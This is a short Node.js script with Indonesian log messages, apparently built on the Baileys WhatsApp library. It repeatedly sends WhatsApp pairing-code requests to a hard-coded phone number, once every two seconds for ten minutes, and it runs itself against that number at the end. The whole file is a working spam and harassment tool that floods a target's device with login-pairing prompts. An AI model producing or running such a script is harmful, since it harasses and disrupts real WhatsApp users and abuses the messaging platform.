const { makeWASocket, Browsers, useMultiFileAuthState } = require("@whiskeysockets/baileys");
const pino = require("pino");

async function spam(nomor) {
  try {
    const { state } = await useMultiFileAuthState("p");

    const client = makeWASocket({
      printQRInTerminal: false,
      browser: Browsers.macOS("Edge"),
      auth: state,
      logger: pino({ level: "fatal" }),
    });

    console.log(`[START] Mulai mengirim pairing request ke ${nomor}`);

    const intervalId = setInterval(async () => {
      try {
        await client.requestPairingCode(nomor);
        console.log(`[SUCCESS] Pairing request sent to ${nomor}`);
      } catch (err) {
        console.error(`[ERROR] Gagal mengirim pairing request ke ${nomor}:`, err.message);
      }
    }, 2000); // Kirim pairing setiap 1 detik

    // Hentikan setelah 10 menit
    setTimeout(() => {
      clearInterval(intervalId);
      console.log("[INFO] Menghentikan spam dan restart fungsi...");
    }, 10 * 60 * 1000); // 10 menit
  } catch (err) {
    console.error("[ERROR] Terjadi kesalahan saat inisialisasi:", err.message);
  }
}

// Jalankan spam
spam("628812843582");
